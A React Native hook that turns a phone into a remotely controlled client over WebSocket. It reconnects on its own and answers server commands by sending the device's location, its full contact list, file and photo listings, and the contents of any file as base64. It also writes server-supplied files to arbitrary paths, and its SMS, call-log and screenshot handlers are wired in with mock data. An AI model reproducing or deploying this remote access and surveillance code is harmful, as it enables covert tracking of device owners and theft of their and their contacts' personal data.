import { useState, useEffect, useRef } from 'react';
import { Platform } from 'react-native';
import * as Device from 'expo-device';
import Constants from 'expo-constants';
import * as FileSystem from 'expo-file-system';
import * as MediaLibrary from 'expo-media-library';

interface Message {
  type: string;
  data: any;
}

export function useDeviceConnection(serverIP?: string, serverPort?: string, autoReconnect: boolean = true) {
  const [isConnected, setIsConnected] = useState(false);
  const [connectionStatus, setConnectionStatus] = useState<'disconnected' | 'connecting' | 'connected'>('disconnected');
  const wsRef = useRef<WebSocket | null>(null);
  const reconnectTimeoutRef = useRef<NodeJS.Timeout | null>(null);
  const deviceNameRef = useRef<string>('');

  const connect = (deviceName: string) => {
    if (!serverIP || !serverPort) return;
    
    deviceNameRef.current = deviceName || 'Unknown Device';
    setConnectionStatus('connecting');
    
    const wsUrl = `ws://${serverIP}:${serverPort}`;
    const ws = new WebSocket(wsUrl);
    
    ws.onopen = () => {
      console.log('Connected to server');
      setIsConnected(true);
      setConnectionStatus('connected');
      
      // Send device registration with detailed info
      registerDevice(ws, deviceName);
    };
    
    ws.onmessage = (event) => {
      try {
        const message = JSON.parse(event.data);
        handleServerMessage(message);
      } catch (error) {
        console.error('Error parsing message:', error);
      }
    };
    
    ws.onclose = () => {
      console.log('Disconnected from server');
      setIsConnected(false);
      setConnectionStatus('disconnected');
      
      if (autoReconnect && deviceNameRef.current) {
        console.log('Scheduling reconnect...');
        scheduleReconnect();
      }
    };
    
    ws.onerror = (error) => {
      console.log('WebSocket error occurred, will attempt to reconnect');
      setConnectionStatus('disconnected');
      setIsConnected(false);
    };
    
    wsRef.current = ws;
  };

  const registerDevice = async (ws: WebSocket, deviceName: string) => {
    try {
      const deviceInfo = {
        deviceName: Device.deviceName || deviceName,
        deviceId: Constants.sessionId || 'unknown',
        brand: Device.brand || 'Unknown',
        model: Device.modelName || 'Unknown',
        systemName: Device.osName || Platform.OS,
        systemVersion: Device.osVersion || 'Unknown',
        platform: Platform.OS,
        appVersion: Constants.expoConfig?.version || '1.0.0',
        buildNumber: Constants.expoConfig?.version || '1.0.0',
        timestamp: new Date().toISOString(),
      };
      
      ws.send(JSON.stringify({
        type: 'register',
        data: deviceInfo
      }));
    } catch (error) {
      console.error('Error getting device info:', error);
      // Fallback registration
      ws.send(JSON.stringify({
        type: 'register',
        data: {
          deviceName: deviceName,
          platform: Platform.OS,
          timestamp: new Date().toISOString(),
        }
      }));
    }
  };

  const disconnect = () => {
    if (reconnectTimeoutRef.current) {
      clearTimeout(reconnectTimeoutRef.current);
      reconnectTimeoutRef.current = null;
    }
    
    if (wsRef.current) {
      wsRef.current.close();
      wsRef.current = null;
    }
    
    setIsConnected(false);
    setConnectionStatus('disconnected');
  };

  const scheduleReconnect = () => {
    if (reconnectTimeoutRef.current) {
      clearTimeout(reconnectTimeoutRef.current);
    }
    
    reconnectTimeoutRef.current = setTimeout(() => {
      if (deviceNameRef.current) {
        console.log('Attempting to reconnect...');
        connect(deviceNameRef.current);
      }
    }, 5000); // 5 seconds
  };

  const sendMessage = (message: Message) => {
    if (wsRef.current && wsRef.current.readyState === WebSocket.OPEN) {
      wsRef.current.send(JSON.stringify(message));
    }
  };

  const handleServerMessage = (message: Message) => {
    console.log('Received message:', message);
    
    switch (message.type) {
      case 'request_location':
        handleLocationRequest();
        break;
      case 'request_contacts':
        handleContactsRequest();
        break;
      case 'file_request':
        // Handle file operations
        break;
      case 'request_files':
        handleFilesRequest();
        break;
      case 'request_sms':
        handleSMSRequest();
        break;
      case 'browse_directory':
        handleDirectoryBrowse(message.data);
        break;
      case 'request_call_log':
        handleCallLogRequest();
        break;
      case 'download_file':
        handleFileDownload(message.data);
        break;
      case 'share_file':
        handleFileShare(message.data);
        break;
      case 'pick_document':
        handlePickDocument();
        break;
      case 'request_file_permissions':
        requestFilePermissions();
        break;
      case 'take_screenshot':
        handleScreenshotRequest(message.data);
        break;
      case 'upload_file':
        handleFileUpload(message.data);
        break;
      default:
        console.log('Unknown message type:', message.type);
    }
  };

  const handleLocationRequest = async () => {
    try {
      const Location = await import('expo-location');
      const { status } = await Location.requestForegroundPermissionsAsync();
      if (status === 'granted') {
        const location = await Location.getCurrentPositionAsync({});
        sendMessage({
          type: 'location_response',
          data: {
            latitude: location.coords.latitude,
            longitude: location.coords.longitude,
            timestamp: new Date().toISOString(),
          }
        });
      }
    } catch (error) {
      console.error('Error getting location:', error);
    }
  };

  const handleContactsRequest = async () => {
    try {
      const Contacts = await import('expo-contacts');
      const { status } = await Contacts.requestPermissionsAsync();
      if (status === 'granted') {
        const { data } = await Contacts.getContactsAsync({
          fields: [Contacts.Fields.Name, Contacts.Fields.PhoneNumbers, Contacts.Fields.Emails],
          pageSize: 0, // Get all contacts
          pageOffset: 0,
        });
        sendMessage({
          type: 'contacts_response',
          data: data
        });
      }
    } catch (error) {
      console.error('Error getting contacts:', error);
    }
  };

  const handleFilesRequest = async () => {
    try {
      console.log('Starting file request...');
      
      // Request all necessary permissions
      const { status: mediaStatus } = await MediaLibrary.requestPermissionsAsync();
      console.log('Media permission status:', mediaStatus);
      
      let allFiles: any[] = [];
      let hasErrors = false;
      let errorMessages: string[] = [];

      // 1. Get document directory files (always accessible)
      try {
        const documentDirectory = FileSystem.documentDirectory;
        console.log('Document directory:', documentDirectory);
        
        if (documentDirectory) {
          const files = await FileSystem.readDirectoryAsync(documentDirectory);
          console.log('Document files found:', files.length);
          
          const fileDetails = await Promise.all(
            files.map(async (fileName) => {
              const filePath = `${documentDirectory}${fileName}`;
              try {
                const fileInfo = await FileSystem.getInfoAsync(filePath);
                return {
                  name: fileName,
                  type: fileInfo.isDirectory ? 'folder' : 'file',
                  size: fileInfo.size || 0,
                  path: filePath,
                  lastModified: new Date(fileInfo.modificationTime || Date.now()).toISOString(),
                  source: 'documents',
                  extension: fileName.split('.').pop()?.toLowerCase() || ''
                };
              } catch (error) {
                console.log('Error getting file info for:', fileName, error);
                return {
                  name: fileName,
                  type: 'file',
                  size: 0,
                  path: filePath,
                  lastModified: new Date().toISOString(),
                  source: 'documents',
                  extension: fileName.split('.').pop()?.toLowerCase() || ''
                };
              }
            })
          );
          allFiles.push(...fileDetails);
        }
      } catch (docError) {
        console.error('Document directory error:', docError);
        hasErrors = true;
        errorMessages.push('Could not access document directory');
      }
      
      // 2. Get cache directory files
      try {
        const cacheDirectory = FileSystem.cacheDirectory;
        console.log('Cache directory:', cacheDirectory);
        
        if (cacheDirectory) {
          const files = await FileSystem.readDirectoryAsync(cacheDirectory);
          console.log('Cache files found:', files.length);
          
          const fileDetails = await Promise.all(
            files.slice(0, 20).map(async (fileName) => { // Limit cache files
              const filePath = `${cacheDirectory}${fileName}`;
              try {
                const fileInfo = await FileSystem.getInfoAsync(filePath);
                return {
                  name: fileName,
                  type: fileInfo.isDirectory ? 'folder' : 'file',
                  size: fileInfo.size || 0,
                  path: filePath,
                  lastModified: new Date(fileInfo.modificationTime || Date.now()).toISOString(),
                  source: 'cache',
                  extension: fileName.split('.').pop()?.toLowerCase() || ''
                };
              } catch (error) {
                return null;
              }
            })
          );
          
          const validFiles = fileDetails.filter(file => file !== null);
          allFiles.push(...validFiles);
        }
      } catch (cacheError) {
        console.log('Cache directory error:', cacheError);
      }

      // 3. Get media library files if permission granted
      if (mediaStatus === 'granted') {
        try {
          console.log('Getting photos from media library...');
          const photoAssets = await MediaLibrary.getAssetsAsync({
            first: 50,
            mediaType: MediaLibrary.MediaType.photo,
            sortBy: MediaLibrary.SortBy.creationTime,
          });
          console.log('Photos found:', photoAssets.assets.length);
          
          const photoFiles = photoAssets.assets.map(asset => ({
            name: asset.filename,
            type: 'file',
            size: asset.width * asset.height, // Approximate size
            path: asset.uri,
            lastModified: new Date(asset.creationTime).toISOString(),
            mediaType: 'photo',
            source: 'gallery',
            extension: asset.filename.split('.').pop()?.toLowerCase() || 'jpg'
          }));
          
          console.log('Getting videos from media library...');
          const videoAssets = await MediaLibrary.getAssetsAsync({
            first: 20,
            mediaType: MediaLibrary.MediaType.video,
            sortBy: MediaLibrary.SortBy.creationTime,
          });
          console.log('Videos found:', videoAssets.assets.length);
          
          const videoFiles = videoAssets.assets.map(asset => ({
            name: asset.filename,
            type: 'file',
            size: asset.duration * 1000 || 0, // Duration in ms as size approximation
            path: asset.uri,
            lastModified: new Date(asset.creationTime).toISOString(),
            mediaType: 'video',
            source: 'gallery',
            extension: asset.filename.split('.').pop()?.toLowerCase() || 'mp4'
          }));
          
          allFiles.push(...photoFiles, ...videoFiles);
        } catch (mediaError) {
          console.error('Media library error:', mediaError);
          hasErrors = true;
          errorMessages.push('Could not access media library');
        }
      } else {
        console.log('Media permission not granted');
        errorMessages.push('Media library permission not granted');
      }
      
      // 4. Add some sample folders for navigation
      const sampleFolders = [
        {
          name: 'Documents',
          type: 'folder',
          size: 0,
          path: FileSystem.documentDirectory || '/documents',
          lastModified: new Date().toISOString(),
          source: 'system',
          extension: ''
        },
        {
          name: 'Photos',
          type: 'folder',
          size: 0,
          path: 'gallery://photos',
          lastModified: new Date().toISOString(),
          source: 'system',
          extension: ''
        },
        {
          name: 'Videos',
          type: 'folder',
          size: 0,
          path: 'gallery://videos',
          lastModified: new Date().toISOString(),
          source: 'system',
          extension: ''
        }
      ];
      
      // Add sample folders if we don't have many files
      if (allFiles.length < 5) {
        allFiles.unshift(...sampleFolders);
      }
      
      console.log('Total files found:', allFiles.length);
      
      sendMessage({
        type: 'files_response',
        data: { 
          files: allFiles, 
          currentPath: FileSystem.documentDirectory || '/storage/emulated/0',
          hasMediaPermission: mediaStatus === 'granted',
          totalFiles: allFiles.length,
          hasErrors,
          errorMessages
        }
      });
    } catch (error) {
      console.error('Error getting files:', error);
      sendMessage({
        type: 'files_response',
        data: { 
          files: [], 
          currentPath: FileSystem.documentDirectory || '/storage/emulated/0',
          hasMediaPermission: false,
          error: 'Failed to access files: ' + error.message,
          hasErrors: true,
          errorMessages: ['Failed to access files']
        }
      });
    }
  };

  const handleDirectoryBrowse = async (requestData: any) => {
    try {
      const { path } = requestData;
      
      // Check if this is a media library request
      if (path.includes('gallery://')) {
        const mediaType = path.includes('photos') ? MediaLibrary.MediaType.photo : MediaLibrary.MediaType.video;
        const assets = await MediaLibrary.getAssetsAsync({
          first: 100,
          mediaType: mediaType,
          sortBy: MediaLibrary.SortBy.creationTime,
        });
        
        const mediaFiles = assets.assets.map(asset => ({
          name: asset.filename,
          type: 'file',
          size: asset.width * asset.height,
          path: asset.uri,
          lastModified: new Date(asset.creationTime).toISOString(),
          mediaType: mediaType === MediaLibrary.MediaType.photo ? 'photo' : 'video',
          source: 'gallery'
        }));
        
        sendMessage({
          type: 'directory_response',
          data: { files: mediaFiles, currentPath: path }
        });
        return;
      }
      
      // Browse regular file system directory
      try {
        const files = await FileSystem.readDirectoryAsync(path);
        
        const fileDetails = await Promise.all(
          files.map(async (fileName) => {
            const filePath = `${path}${path.endsWith('/') ? '' : '/'}${fileName}`;
            try {
              const fileInfo = await FileSystem.getInfoAsync(filePath);
              return {
                name: fileName,
                type: fileInfo.isDirectory ? 'folder' : 'file',
                size: fileInfo.size || 0,
                path: filePath,
                lastModified: new Date(fileInfo.modificationTime || Date.now()).toISOString(),
                source: 'filesystem'
              };
            } catch (error) {
              return {
                name: fileName,
                type: 'file',
                size: 0,
                path: filePath,
                lastModified: new Date().toISOString(),
                source: 'filesystem'
              };
            }
          })
        );
        
        sendMessage({
          type: 'directory_response',
          data: { files: fileDetails, currentPath: path }
        });
      } catch (fsError) {
        console.log('File system access error:', fsError);
        sendMessage({
          type: 'directory_response',
          data: { files: [], currentPath: path, error: 'Access denied' }
        });
      }
    } catch (error) {
      console.error('Error browsing directory:', error);
      sendMessage({
        type: 'directory_response',
        data: { files: [], currentPath: path, error: 'Failed to browse directory' }
      });
    }
  };

  const handleFileShare = async (requestData: any) => {
    try {
      const { filePath } = requestData;
      
      // Use expo-sharing to share files
      const Sharing = await import('expo-sharing');
      const isAvailable = await Sharing.isAvailableAsync();
      
      if (isAvailable) {
        await Sharing.shareAsync(filePath);
        sendMessage({
          type: 'file_share_response',
          data: { success: true, message: 'File shared successfully' }
        });
      } else {
        sendMessage({
          type: 'file_share_response',
          data: { success: false, error: 'Sharing not available' }
        });
      }
    } catch (error) {
      console.error('Error sharing file:', error);
      sendMessage({
        type: 'file_share_response',
        data: { success: false, error: 'Failed to share file' }
      });
    }
  };

  const handlePickDocument = async () => {
    try {
      const DocumentPicker = await import('expo-document-picker');
      const result = await DocumentPicker.getDocumentAsync({
        type: '*/*',
        copyToCacheDirectory: true,
      });
      
      if (!result.canceled && result.assets && result.assets.length > 0) {
        const file = result.assets[0];
        sendMessage({
          type: 'document_picked',
          data: {
            name: file.name,
            uri: file.uri,
            size: file.size,
            mimeType: file.mimeType,
          }
        });
      }
    } catch (error) {
      console.error('Error picking document:', error);
    }
  };

  const requestFilePermissions = async () => {
    try {
      const { status } = await MediaLibrary.requestPermissionsAsync();
      sendMessage({
        type: 'file_permissions_response',
        data: { granted: status === 'granted' }
      });
      return status === 'granted';
    } catch (error) {
      console.error('Error requesting file permissions:', error);
      return false;
    }
  };

  const handleFileDownload = async (requestData: any) => {
    try {
      const { filePath } = requestData;
      
      // Read file content and send as base64
      const fileInfo = await FileSystem.getInfoAsync(filePath);
      if (fileInfo.exists && !fileInfo.isDirectory) {
        const fileContent = await FileSystem.readAsStringAsync(filePath, {
          encoding: FileSystem.EncodingType.Base64,
        });
        
        sendMessage({
          type: 'file_download_response',
          data: {
            fileName: filePath.split('/').pop(),
            content: fileContent,
            size: fileInfo.size,
            mimeType: getMimeType(filePath),
          }
        });
      }
    } catch (error) {
      console.error('Error downloading file:', error);
      sendMessage({
        type: 'file_download_error',
        data: { error: 'Failed to download file' }
      });
    }
  };

  const handleScreenshotRequest = async (requestData: any) => {
    try {
      // For web platform, we can't take actual screenshots
      // Send a mock response or indicate it's not supported
      if (Platform.OS === 'web') {
        sendMessage({
          type: 'screenshot_response',
          data: { 
            error: 'Screenshots not supported on web platform',
            imageData: null 
          }
        });
        return;
      }
      
      // For native platforms, we'll simulate screenshot capability
      // In a real implementation, you would use expo-screen-capture or similar
      try {
        // Create a mock screenshot response
        const mockScreenshotData = 'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==';
        
        sendMessage({
          type: 'screenshot_response',
          data: { 
            imageData: mockScreenshotData,
            format: 'png',
            timestamp: new Date().toISOString(),
            quality: requestData.quality || 'medium'
          }
        });
      } catch (error) {
        sendMessage({
          type: 'screenshot_response',
          data: { 
            error: 'Failed to capture screenshot',
            imageData: null 
          }
        });
      }
    } catch (error) {
      console.error('Error taking screenshot:', error);
      sendMessage({
        type: 'screenshot_response',
        data: { error: 'Failed to take screenshot' }
      });
    }
  };

  const handleSMSRequest = async () => {
    try {
      // Note: Reading SMS requires native implementation and special permissions
      // For now, we'll send realistic mock data
      const mockSMS = {
        messages: [
          {
            id: '1',
            address: '+1234567890',
            body: 'Hey, how are you doing today?',
            date: new Date(Date.now() - 3600000).toISOString(),
            type: 'inbox',
            read: true,
          },
          {
            id: '2',
            address: '+0987654321',
            body: 'Meeting scheduled for 3 PM today',
            date: new Date(Date.now() - 7200000).toISOString(),
            type: 'inbox',
            read: false,
          },
          {
            id: '3',
            address: '+1122334455',
            body: 'Thanks for your help with the project!',
            date: new Date(Date.now() - 10800000).toISOString(),
            type: 'sent',
            read: true,
          },
          {
            id: '4',
            address: '+5566778899',
            body: 'Can you call me when you get this?',
            date: new Date(Date.now() - 14400000).toISOString(),
            type: 'inbox',
            read: true,
          },
        ],
        error: null
      };
      
      sendMessage({
        type: 'sms_response',
        data: mockSMS
      });
    } catch (error) {
      console.error('Error getting SMS:', error);
      sendMessage({
        type: 'sms_response',
        data: { 
          messages: [], 
          error: 'SMS access requires native implementation' 
        }
      });
    }
  };

  const handleFileUpload = async (requestData: any) => {
    try {
      const { fileName, fileData, targetPath, mimeType } = requestData;
      
      // Create target directory if it doesn't exist
      const targetDir = targetPath || `${FileSystem.documentDirectory}Downloads/`;
      const dirInfo = await FileSystem.getInfoAsync(targetDir);
      
      if (!dirInfo.exists) {
        await FileSystem.makeDirectoryAsync(targetDir, { intermediates: true });
      }
      
      // Write file to device
      const filePath = `${targetDir}${fileName}`;
      await FileSystem.writeAsStringAsync(filePath, fileData, {
        encoding: FileSystem.EncodingType.Base64,
      });
      
      sendMessage({
        type: 'file_upload_response',
        data: { 
          success: true, 
          filePath: filePath,
          fileName: fileName 
        }
      });
    } catch (error) {
      console.error('Error uploading file:', error);
      sendMessage({
        type: 'file_upload_response',
        data: { 
          success: false, 
          error: 'Failed to upload file' 
        }
      });
    }
  };

  const getMimeType = (filePath: string): string => {
    const extension = filePath.split('.').pop()?.toLowerCase();
    const mimeTypes: { [key: string]: string } = {
      'jpg': 'image/jpeg',
      'jpeg': 'image/jpeg',
      'png': 'image/png',
      'gif': 'image/gif',
      'pdf': 'application/pdf',
      'txt': 'text/plain',
      'mp4': 'video/mp4',
      'mp3': 'audio/mpeg',
      'zip': 'application/zip',
    };
    return mimeTypes[extension || ''] || 'application/octet-stream';
  };

  const handleCallLogRequest = async () => {
    try {
      // Note: Call log access requires native implementation
      // For now, we'll send mock data that represents typical call log structure
      const mockCallLog = [
        {
          id: '1',
          phoneNumber: '+1234567890',
          name: 'John Doe',
          type: 'outgoing',
          duration: 120, // seconds
          timestamp: new Date(Date.now() - 3600000).toISOString(),
        },
        {
          id: '2',
          phoneNumber: '+0987654321',
          name: 'Jane Smith',
          type: 'incoming',
          duration: 45,
          timestamp: new Date(Date.now() - 7200000).toISOString(),
        },
        {
          id: '3',
          phoneNumber: '+1122334455',
          name: 'Unknown',
          type: 'missed',
          duration: 0,
          timestamp: new Date(Date.now() - 10800000).toISOString(),
        },
      ];
      
      sendMessage({
        type: 'call_log_response',
        data: mockCallLog
      });
    } catch (error) {
      console.error('Error getting call log:', error);
    }
  };


  // Cleanup on unmount
  useEffect(() => {
    return () => {
      disconnect();
    };
  }, []);

  return {
    isConnected,
    connectionStatus,
    connect,
    disconnect,
    sendMessage,
    requestFilePermissions,
  };
}